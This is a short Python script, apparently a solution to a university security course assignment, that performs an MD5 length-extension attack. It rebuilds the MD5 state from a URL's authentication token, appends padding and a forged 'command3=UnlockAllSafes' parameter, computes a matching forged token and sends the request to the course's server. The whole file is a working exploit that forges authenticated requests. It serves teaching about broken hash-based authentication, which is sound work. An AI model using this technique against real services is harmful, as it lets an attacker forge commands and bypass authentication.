import http.client, urllib.parse, sys
from pymd5 import md5, padding
url = sys.argv[1]
#url = "http://cis551.cis.upenn.edu/project2/api?token=0c6edcc81c7714b37a87cee7bb1f3d89&user=aturing&command1=ListSquirrels&command2=NoOp"

# Your code to modify url goes here
idx1 = url.index("token")
idx2 = url.index("user")
old_token = url[idx1+6:idx2-1]
#print(old_token)
message = url[idx2:]
#bit_len is length of token in bit
bit_len = 10*8 + len(message)*8
#new_count is length of token + padding content in bit
new_count = bit_len + len(padding(bit_len))*8
h = md5(state=bytes.fromhex(old_token), count= new_count)
x = "&command3=UnlockAllSafes"
h.update(x.encode())
new_token = str(h.hexdigest())

url = url[:idx1+6]+new_token+url[idx2-1:] + urllib.parse.quote(padding(bit_len))+x
#print(url)

parsedUrl = urllib.parse.urlparse(url)
conn = http.client.HTTPConnection(parsedUrl.hostname,parsedUrl.port)
conn.request("GET", parsedUrl.path + "?" + parsedUrl.query)
print(conn.getresponse().read())

